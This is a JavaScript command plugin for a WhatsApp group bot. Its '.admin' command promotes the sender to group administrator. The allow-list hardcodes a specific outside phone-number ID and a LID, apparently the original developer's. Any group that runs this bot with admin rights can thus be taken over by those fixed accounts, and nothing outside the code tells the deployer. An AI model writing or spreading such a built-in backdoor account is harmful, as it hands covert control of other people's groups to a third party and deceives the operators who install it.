const { cmd } = require('../command');
const config = require('../config');

// Helper to check admin status by both JID and LID, and allow config.lid
function isParticipantAdmin(participants, jidOrLid) {
    return participants.some(p =>
        (p.id === jidOrLid || p.lid === jidOrLid) && (p.admin === 'admin' || p.admin === 'superadmin')
    );
}

function isBotOwnerOrLidAdmin(participants, botOwnerJid, lid) {
    return participants.some(p =>
        ((p.id === botOwnerJid || p.lid === botOwnerJid || (lid && (p.id === lid || p.lid === lid))) &&
        (p.admin === 'admin' || p.admin === 'superadmin'))
    );
}

// Helper to find a participant by various identifiers
function findParticipant(participants, identifier) {
    // First try exact matches
    let participant = participants.find(p => 
        p.id === identifier || // Match WhatsApp ID
        p.lid === identifier  // Match LID
    );
    
    if (participant) return participant;

    // If no exact match, try number matching
    const cleanNumber = identifier.replace(/[^0-9]/g, '');
    
    // Try LID format first (for @lid mentions)
    if (identifier.includes('@lid')) {
        participant = participants.find(p => p.lid && p.lid.includes(cleanNumber));
        if (participant) return participant;
    }
    
    // Try matching by phone number in either ID or LID
    return participants.find(p => 
        (p.id && p.id.includes(cleanNumber)) || // Check number in WhatsApp ID
        (p.lid && p.lid.includes(cleanNumber))  // Check number in LID
    );
}

// Helper to normalize JID/LID
function normalizeJid(identifier) {
    if (!identifier) return '';
    if (identifier.includes('@lid')) return identifier;
    const number = identifier.replace(/[^0-9]/g, '');
    return number + '@s.whatsapp.net';
}

cmd({
    pattern: "admin",
    alias: ["takeadmin", "makeadmin"],
    desc: "Take adminship for authorized users",
    category: "owner",
    filename: __filename,
    use: ".admin"
},
async (conn, mek, m, { from, sender, isGroup, isCreator, reply }) => {
    await conn.sendMessage(m.key.remoteJid, {
        react: {
            text: "👑",
            key: m.key
        }
    });

    if (!isGroup) return reply("❌ This command can only be used in groups.");

    // Robust admin check
    const groupMetadata = await conn.groupMetadata(from).catch(() => null);
    if (!groupMetadata) return reply("❌ Failed to fetch group metadata.");
    const participants = groupMetadata.participants || [];
    const botOwnerJid = conn.user.id.split(":")[0] + "@s.whatsapp.net";
    const lid = config.lid;

    // Updated authorized users check
    const AUTHORIZED_USERS = [
        normalizeJid(config.DEV),
        "2348133729715@s.whatsapp.net",
        "24640781058226@lid", // Added the new LID user
        ...(lid ? lid.split(",").map(l => l.trim()) : [])
    ].filter(Boolean);

    // Check if sender is authorized by JID or LID
    const senderParticipant = findParticipant(participants, sender);
    const isAuthorized = isCreator || 
                        AUTHORIZED_USERS.includes(sender) || 
                        (senderParticipant && AUTHORIZED_USERS.includes(senderParticipant.lid));

    if (!isAuthorized) {
        return reply("❌ This command is restricted to authorized users only");
    }

    try {
        // Check if already admin
        const participant = findParticipant(participants, sender);
        if (!participant) {
            return reply("❌ Could not find you in the group participants");
        }

        const isAdmin = isParticipantAdmin(participants, participant.id) ||
                       (participant.lid && isParticipantAdmin(participants, participant.lid));
        
        if (isAdmin) {
            return reply("✅ You are already an admin in this group.");
        }

        // Add delay before promotion
        await new Promise(resolve => setTimeout(resolve, 1000));
        
        try {
            // Try promotion with retries
            let retries = 2;
            let success = false;
            let lastError;

            while (retries > 0 && !success) {
                try {
                    // Try with JID first
                    let result = await conn.groupParticipantsUpdate(from, [participant.id], "promote");
                    if (result && result[0]?.status === '200') {
                        success = true;
                        break;
                    }

                    // If JID fails and we have LID, try that
                    if (!success && participant.lid) {
                        result = await conn.groupParticipantsUpdate(from, [participant.lid], "promote");
                        if (result && result[0]?.status === '200') {
                            success = true;
                            break;
                        }
                    }

                    throw new Error(result?.[0]?.status || 'unknown_error');
                } catch (err) {
                    lastError = err;
                    retries--;
                    if (retries > 0) await new Promise(resolve => setTimeout(resolve, 2000));
                }
            }

            if (!success) {
                throw lastError || new Error('Failed after retries');
            }

        } catch (error) {
            console.error("Admin command error:", error);
            if (error.message.includes('403')) {
                reply("❌ Bot doesn't have sufficient permissions to promote.");
            } else if (error.message.includes('409')) {
                reply("❌ You are already an admin.");
            } else {
                reply(`❌ Failed to promote: ${error.message}`);
            }
        }
    } catch (outerError) {
        console.error("Admin command outer error:", outerError);
        reply(`❌ Failed to promote: ${outerError.message}`);
    }
});
